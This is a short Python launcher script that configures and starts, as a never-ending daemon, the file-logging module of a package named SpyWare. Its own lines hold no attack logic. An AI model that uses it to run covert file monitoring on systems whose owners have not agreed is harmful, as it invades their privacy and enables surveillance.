from SpyWare.FilesLogger import Daemon, filesConfig

filesConfig("my.conf")

Daemon().run_for_ever()
